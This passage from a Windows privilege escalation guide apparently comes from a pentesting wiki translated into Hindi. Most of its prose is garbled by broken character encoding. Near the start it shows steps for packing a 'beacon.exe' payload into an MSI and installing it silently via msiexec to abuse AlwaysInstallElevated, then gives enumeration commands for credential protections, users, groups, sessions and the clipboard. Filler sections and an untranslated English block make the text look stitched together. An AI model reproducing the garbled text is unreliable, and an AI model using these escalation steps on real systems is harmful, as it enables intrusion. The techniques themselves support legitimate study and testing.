* **Solution Explorer** рдореЗрдВ **AlwaysPrivesc** рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЛ рд╣рд╛рдЗрд▓рд╛рдЗрдЯ рдХрд░реЗрдВ рдФрд░ **Properties** рдореЗрдВ рдЬрд╛рдПрдВ, **TargetPlatform** рдХреЛ **x86** рд╕реЗ **x64** рдореЗрдВ рдмрджрд▓реЗрдВред
* рдЖрдк рдЕрдиреНрдп рдЧреБрдг рднреА рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ **Author** рдФрд░ **Manufacturer**, рдЬреЛ рд╕реНрдерд╛рдкрд┐рдд рдРрдк рдХреЛ рдЕрдзрд┐рдХ рд╡рд┐рдзрд┐ рд╕реЗ рджрд┐рдЦрд╛ рд╕рдХрддреЗ рд╣реИрдВред
* рдкрд░рд┐рдпреЛрдЬрдирд╛ рдкрд░ рджрд╛рдпрд╛рдВ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ **View > Custom Actions** рдХрд╛ рдЪрдпрди рдХрд░реЗрдВред
* **Install** рдкрд░ рджрд╛рдпрд╛рдВ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ **Add Custom Action** рдХрд╛ рдЪрдпрди рдХрд░реЗрдВред
* **Application Folder** рдкрд░ рджреЛрд╣рд░реА-рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, рдЕрдкрдиреА **beacon.exe** рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдФрд░ **OK** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред рдЗрд╕рд╕реЗ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рд╣реЛрдЧрд╛ рдХрд┐ рдмреАрдХрди рдкреЗрд▓реЛрдб рдХреЛ рдЗрдВрд╕реНрдЯреЙрд▓рд░ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреИрд╕реЗ рд╣реА рдЗрдВрд╕реНрдЯреЙрд▓рд░ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **Custom Action Properties** рдХреЗ рддрд╣рдд, **Run64Bit** рдХреЛ **True** рдореЗрдВ рдмрджрд▓реЗрдВред
* рдЕрдВрдд рдореЗрдВ, рдЗрд╕реЗ **рдмрд┐рд▓реНрдб рдХрд░реЗрдВ**ред
* рдпрджрд┐ рдЪреЗрддрд╛рд╡рдиреА `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` рджрд┐рдЦрд╛рдИ рджреЗрддреА рд╣реИ, рддреЛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЖрдкрдиреЗ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдХреЛ x64 рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рд╣реИред

### MSI рд╕реНрдерд╛рдкрдирд╛

рдЦрддрд░рдирд╛рдХ `.msi` рдлрд╝рд╛рдЗрд▓ рдХреА **рд╕реНрдерд╛рдкрдирд╛** рдХреЛ **рдкреГрд╖реНрдарднреВрдорд┐ рдореЗрдВ** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
рдЗрд╕ рд╕рдВрдХрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: _exploit/windows/local/always\_install\_elevated_

## рдПрдВрдЯреАрд╡рд╛рдпрд░рд╕ рдФрд░ рдбрд┐рдЯреЗрдХреНрдЯрд░

### рдСрдбрд┐рдЯ рд╕реЗрдЯрд┐рдВрдЧреНрд╕

рдпреЗ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддреА рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ **рд▓реЙрдЧ** рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдзреНрдпрд╛рди рджреЗрдирд╛ рдЪрд╛рд╣рд┐рдПред
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, рдпрд╣ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рд░реЛрдЪрдХ рд╣реИ рдХрд┐ рд▓реЙрдЧ рдХрд╣рд╛рдВ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВред
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** рдЖрдкрдХреЛ рдбреЛрдореЗрди-рдЬреБрдбрд╝реЗ рдХрдВрдкреНрдпреВрдЯрд░реЛрдВ рдкрд░ рд╕реНрдерд╛рдиреАрдп рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдкрд╛рд╕рд╡рд░реНрдб (рдЬреЛ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ, рдЕрджреНрд╡рд┐рддреАрдп рдФрд░ рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рдмрджрд▓рддрд╛ рд╣реИ) рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдпреЗ рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗрдВрдЯреНрд░рд▓реА рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдПрдХреНрдЯрд┐рд╡ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ рдФрд░ рдЕрдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ ACL рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрджрд┐ рдЖрдкрдХреЛ рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рддреА рд╣реИ рддреЛ рдЖрдк рд╕реНрдерд╛рдиреАрдп рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХреЛрдВ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВред

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

рдпрджрд┐ рд╕рдХреНрд░рд┐рдп рд╣реИ, рддреЛ **рдкреНрд▓реЗрди-рдЯреЗрдХреНрд╕реНрдЯ рдкрд╛рд╕рд╡рд░реНрдб LSASS рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВ** (рд╕реНрдерд╛рдиреАрдп рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдЙрдкрдирд┐рдпрдВрддреНрд░рдг рд╕реЗрд╡рд╛)ред\
[**рдЗрд╕ рдкреГрд╖реНрда рдореЗрдВ WDigest рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА**](../stealing-credentials/credentials-protections.md#wdigest)ред
```
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
```
### LSA рд╕реБрд░рдХреНрд╖рд╛

рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдиреЗ **Windows 8.1 рдФрд░ рдмрд╛рдж рдореЗрдВ** LSA рдХреА рдЕрддрд┐рд░рд┐рдХреНрдд рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рджрд╛рди рдХреА рд╣реИ рддрд╛рдХрд┐ рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдВ рдЗрд╕рдХреА рдореЗрдореЛрд░реА рдХреЛ **рдкрдврд╝рдиреЗ** рдпрд╛ рдХреЛрдб рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдХреНрд╖рдо рди рдмрдирд╛ рд╕рдХреЗрдВред\
[**LSA рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдВ**](../stealing-credentials/credentials-protections.md#lsa-protection).
```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
```
### рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдЧрд╛рд░реНрдб

**рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдЧрд╛рд░реНрдб** рд╡рд┐рдВрдбреЛрдЬ 10 (рдПрдВрдЯрд░рдкреНрд░рд╛рдЗрдЬ рдФрд░ рдПрдЬреБрдХреЗрд╢рди рд╕рдВрд╕реНрдХрд░рдг) рдореЗрдВ рдПрдХ рдирдИ рд╕реБрд╡рд┐рдзрд╛ рд╣реИ рдЬреЛ рдЖрдкрдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдкрд╛рд╕ рдж рд╣реИрд╢ рдЬреИрд╕реЗ рдЦрддрд░реЛрдВ рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддреА рд╣реИред\
[**рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдЧрд╛рд░реНрдб рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдБред**](../stealing-credentials/credentials-protections.md#credential-guard)
```
reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
```
### рдХреИрд╢ рдХрд┐рдП рдЧрдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕

**рдбреЛрдореЗрди рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдШрдЯрдХреЛрдВ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ **рд╕реНрдерд╛рдиреАрдп рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рд╛рдзрд┐рдХрд░рдг** (LSA) рджреНрд╡рд╛рд░рд╛ **рдкреНрд░рдорд╛рдгрд┐рдд** рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдЖрдорддреМрд░ рдкрд░, рдбреЛрдореЗрди рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдЬрдм рдПрдХ рдкрдВрдЬреАрдХреГрдд рд╕реБрд░рдХреНрд╖рд╛ рдкреИрдХреЗрдЬ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓реЙрдЧрдСрди рдбреЗрдЯрд╛ рдХреЛ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рддрд╛ рд╣реИред\
[**рдХреИрд╢ рдХрд┐рдП рдЧрдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдВ**](../stealing-credentials/credentials-protections.md#cached-credentials).
```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ рд╕рдореВрд╣

### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ рд╕рдореВрд╣реЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ

рдЖрдкрдХреЛ рдпрд╣ рдЬрд╛рдВрдЪрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдЖрдкрдХреЗ рд╕рдореВрд╣реЛрдВ рдореЗрдВ рд╕реЗ рдХреЛрдИ рднреА рдРрд╕реЗ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ рдЬреЛ рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛ рд╕рдХрддреА рд╣реИрдВред
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### рдкреНрд░рдмрдВрдзрд┐рдд рд╕рдореВрд╣

рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рдкреНрд░рдмрдВрдзрд┐рдд рд╕рдореВрд╣ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред рдпрд╣рд╛рдВ рдкреНрд░рдмрдВрдзрд┐рдд рд╕рдореВрд╣реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХреИрд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░реЗрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдиреЗрдВ:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### рдЯреЛрдХрди рдорд╛рдирд┐рдкреБрд▓реЗрд╢рди

рдЗрд╕ рдкреГрд╖реНрда рдкрд░ рдЯреЛрдХрди рдХреНрдпрд╛ рд╣реИ рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЕрдзрд┐рдХ рдЬрд╛рдиреЗрдВ: [Windows Tokens](../authentication-credentials-uac-and-efs.md#access-tokens).\
рджрд┐рдП рдЧрдП рдкреГрд╖реНрда рдкрд░ рджрд┐рдП рдЧрдП рд░реЛрдЪрдХ рдЯреЛрдХрдиреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдиреЗрдВ:

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### рд▓реЙрдЧ рдЗрди рдХрд┐рдП рдЧрдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ / рд╕рддреНрд░
```
qwinsta
klist sessions
```
### рд╣реЛрдо рдлрд╝реЛрд▓реНрдбрд░реНрд╕

рд╡рд┐рдВрдбреЛрдЬ рдореЗрдВ рд╣реЛрдо рдлрд╝реЛрд▓реНрдбрд░реНрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЛрдВ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕реНрдерд╛рди рд╣реЛрддреЗ рд╣реИрдВред рдЗрди рдлрд╝реЛрд▓реНрдбрд░реНрд╕ рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдирд┐рдЬреА рдбреЗрдЯрд╛, рджрд╕реНрддрд╛рд╡реЗрдЬрд╝, рдбреЗрд╕реНрдХрдЯреЙрдк рдЖрдЗрдЯрдореНрд╕, рдФрд░ рдЕрдиреНрдп рд╕рдВрдмрдВрдзрд┐рдд рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕рдВрдЧреНрд░рд╣рд┐рдд рд╣реЛрддреА рд╣реИрдВред рд╣реЛрдо рдлрд╝реЛрд▓реНрдбрд░реНрд╕ рдХрд╛ рдорд╛рд░реНрдЧ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рд╕реНрдерд╛рдирд╛рдВрддрд░рдг рдХреЗ рджреМрд░рд╛рди рдмрдирд╛рдП рд░рдЦрдирд╛ рдЪрд╛рд╣рд┐рдП, рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдбреЗрдЯрд╛ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдиреБрднрд╡ рдореЗрдВ рд╕реБрдзрд╛рд░ рд╣реЛрддрд╛ рд╣реИред

рд╡рд┐рдВрдбреЛрдЬ рдореЗрдВ рд╣рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрд▓рдЧ рд╣реЛрдо рдлрд╝реЛрд▓реНрдбрд░ рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдирд╛рдо рд╕реЗ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рдХреЛ рдмрдирд╛рддреЗ рд╕рдордп, рд╡рд┐рдВрдбреЛрдЬ рдЖрдкрдХреЛ рдПрдХ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╣реЛрдо рдлрд╝реЛрд▓реНрдбрд░ рдХрд╛ рд╡рд┐рдХрд▓реНрдк рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЖрдк рдЗрд╕реЗ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред

рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рдХреЗ рд╣реЛрдо рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдбреЗрдЯрд╛ рдФрд░ рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕рдВрдЧреНрд░рд╣рд┐рдд рд╣реЛ рд╕рдХрддреА рд╣реИрдВ:

- рджрд╕реНрддрд╛рд╡реЗрдЬрд╝: рдЯреЗрдХреНрд╕реНрдЯ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝, рд╕реНрдкреНрд░реЗрдбрд╢реАрдЯ, рдкреНрд░реЗрдЬрд╝реЗрдВрдЯреЗрд╢рди рдЖрджрд┐ред
- рдбреЗрд╕реНрдХрдЯреЙрдк рдЖрдЗрдЯрдореНрд╕: рдбреЗрд╕реНрдХрдЯреЙрдк рдкрд░ рджрд┐рдЦрд╛рдИ рджреЗрдиреЗ рд╡рд╛рд▓реЗ рдлрд╝рд╛рдЗрд▓реЗрдВ рдФрд░ рдлрд╝реЛрд▓реНрдбрд░реНрд╕ред
- рдбрд╛рдЙрдирд▓реЛрдбреНрд╕: рдЗрдВрдЯрд░рдиреЗрдЯ рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓реЗрдВред
- рдореНрдпреВрдЬрд╝рд┐рдХ: рдСрдбрд┐рдпреЛ рдлрд╝рд╛рдЗрд▓реЗрдВ рдФрд░ рд╕рдВрдЧреАрдд рдкреНрд▓реЗрд▓рд┐рд╕реНрдЯреНрд╕ред
- рдкрд┐рдХреНрдЪрд░реНрд╕: рдЫрд╡рд┐рдпрд╛рдБ рдФрд░ рдлрд╝реЛрдЯреЛ рдПрд▓реНрдмрдоред
- рд╡реАрдбрд┐рдпреЛ: рд╡реАрдбрд┐рдпреЛ рдлрд╝рд╛рдЗрд▓реЗрдВред
- рдбреЙрдХреНрдпреВрдореЗрдВрдЯреНрд╕: рдЕрдиреНрдп рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдлрд╝рд╛рдЗрд▓реЗрдВред

рдпрджрд┐ рдЖрдк рд╡рд┐рдВрдбреЛрдЬ рдореЗрдВ рд╣реЛрдо рдлрд╝реЛрд▓реНрдбрд░реНрд╕ рдХреЛ рд╣рд╛рд░реНрдбрди рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрджрдореЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

1. рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рдХреЛ рдмрдирд╛рдиреЗ рдХреЗ рджреМрд░рд╛рди рдПрдХ рдЕрд▓рдЧ рд╣реЛрдо рдлрд╝реЛрд▓реНрдбрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░реЗрдВред
2. рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХрд╛рд░рд┐рдХрддрд╛ рд╕реЗрдЯ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдХреЗрд╡рд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рддрдХ рд╣реА рдкрд╣реБрдВрдЪ рд╣реЛ рд╕рдХреЗред
3. рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рдкрд╛рд╕рд╡рд░реНрдб рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░реЗрдВред
4. рдЕрдирд╛рд╡рд╢реНрдпрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЛрдВ рдХреЛ рд╣рдЯрд╛ рджреЗрдВ рдпрд╛ рдЕрдХреНрд╖рдо рдХрд░реЗрдВред
5. рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдбреЗрдЯрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмреИрдХрдЕрдк рдирд┐рд░реНрдорд┐рдд рдХрд░реЗрдВ рдФрд░ рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рдмреИрдХрдЕрдк рд▓реЗрдВред

рдпрджрд┐ рдЖрдк рд╡рд┐рдВрдбреЛрдЬ рдореЗрдВ рд╣реЛрдо рдлрд╝реЛрд▓реНрдбрд░реНрд╕ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рд╡рд┐рдВрдбреЛрдЬ рдбреЙрдХреНрдпреВрдореЗрдВрдЯреЗрд╢рди рдФрд░ рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
dir C:\Users
Get-ChildItem C:\Users
```
### рдкрд╛рд╕рд╡рд░реНрдб рдиреАрддрд┐

рдПрдХ рдордЬрдмреВрдд рдкрд╛рд╕рд╡рд░реНрдб рдиреАрддрд┐ рдЕрдкрдирд╛рдирд╛ рдЕрддреНрдпрдВрдд рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рддрд╛рдХрд┐ рдХрд┐рд╕реА рднреА рдЕрдирдзрд┐рдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЖрдкрдХреЗ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдкреНрд░рд╡реЗрд╢ рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХреЗред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдиреАрддрд┐ рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдПрдХ рдордЬрдмреВрдд рдкрд╛рд╕рд╡рд░реНрдб рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░реЗрдВ:

- рдкрд╛рд╕рд╡рд░реНрдб рдХреА рд▓рдВрдмрд╛рдИ рдХрдо рд╕реЗ рдХрдо 8 рд╡рд░реНрдг рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред
- рдкрд╛рд╕рд╡рд░реНрдб рдореЗрдВ рдХрдо рд╕реЗ рдХрдо рдПрдХ рдЕрдкрд░рдХреЗрд╕ рдЕрдХреНрд╖рд░ (A-Z), рдПрдХ рд▓реЛрдЕрд░рдХреЗрд╕ рдЕрдХреНрд╖рд░ (a-z), рдПрдХ рд╕рдВрдЦреНрдпрд╛ (0-9), рдФрд░ рдПрдХ рд╡рд┐рд╢реЗрд╖ рд╡рд░реНрдг (!@#$%^&*) рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред
- рдкрд╛рд╕рд╡рд░реНрдб рдореЗрдВ рдЕрджреНрдпрддрд┐рдд рддрд┐рдерд┐ рдХреЗ рдмрд╛рдж 90 рджрд┐рдиреЛрдВ рдХреЗ рдмрд╛рдж рдкрд░рд┐рд╡рд░реНрддрди рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред
- рдкрд┐рдЫрд▓реЗ 5 рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдирдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдирд╣реАрдВ рдмрдирд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред
- рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЕрджреНрдпрддрд┐рдд рдкрд╛рд╕рд╡рд░реНрдб рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░реЛрдореНрдкреНрдЯ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред

рдпрджрд┐ рдЖрдк рдЗрди рдиреАрддрд┐рдпреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЗ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрдиреЗ рдореЗрдВ рдорджрдж рдорд┐рд▓реЗрдЧреА рдФрд░ рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдВрдЪ рд╕реЗ рдмрдЪрд╛рдПрдЧреАред
```
net accounts
```
### рдХреНрд▓рд┐рдкрдмреЛрд░реНрдб рдХреА рд╕рд╛рдордЧреНрд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

To get the content of the clipboard in Windows, you can use the following methods:

#### Method 1: Command Prompt

1. Open the Command Prompt as an administrator.
2. Type the following command and press Enter:
   ```
   powershell -command "Get-Clipboard"
   ```

#### Method 2: PowerShell

1. Open PowerShell as an administrator.
2. Use the following command to get the clipboard content:
   ```
   Get-Clipboard
   ```

After executing either of these methods, the content of the clipboard will be displayed in the console output.
```bash
powershell -command "Get-Clipboard"
```
## рдЪрд▓ рд░рд╣реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ

### рдлрд╝рд╛рдЗрд▓ рдФрд░ рдлрд╝реЛрд▓реНрдбрд░ рдЕрдиреБрдорддрд┐рдпрд╛рдБ

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛рдиреЗ рдХреЗ рдмрд╛рдж **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб рдЬрд╛рдВрдЪреЗрдВ**ред\
